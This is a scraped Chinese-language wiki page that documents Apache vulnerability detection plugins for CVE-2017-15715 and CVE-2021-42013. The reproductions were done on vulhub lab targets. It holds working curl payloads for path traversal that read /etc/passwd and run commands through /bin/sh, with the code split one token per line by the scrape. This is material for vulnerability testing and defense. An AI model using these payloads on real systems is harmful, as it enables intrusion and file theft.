# Apache插件使用 | Yak Program Language

- 来源: https://yaklang.com/en/Yaklab/wiki/DetectionPlug-in/Apache/
- 抓取时间: 2026-02-06T07:03:41Z

---
## 1 CVE-2017-15715 #

插件id：

f7c170b3-77de-4af3-8551-6da4ce1bd471

漏洞描述：

Apache HTTPD换行解析漏洞，Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。

测试过程：

vulhub靶场访问测试网站，上传一个php文件，被拦截

在test.php后面插入一个\x0A，成功上传

访问刚才上传的/test.php%0A，发现能够成功解析

## 2 CVE-2021-42013 #

插件id：

239d9646-1ca4-471e-a9b4-5ab0534f759b

漏洞描述：

Apache HTTP Server 2.4.50 路径穿越漏洞，攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。

测试过程：

vulhub靶场访问测试网站，使用.%%32%65进行漏洞利用，成功读取到/etc/passwd

```
curl 
-
v 
--
path
-
as
-
is http
:
/
/
your
-
ip
:
8080
/
icons
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
etc
/
passwd
```

在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令

```
curl 
-
v 
--
data 
"echo;id"
 'http
:
/
/
your
-
ip
:
8080
/
cgi
-
bin
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
.
%
%
32
%
65
/
bin
/
sh'
```

- 1 CVE-2017-15715
- 2 CVE-2021-42013
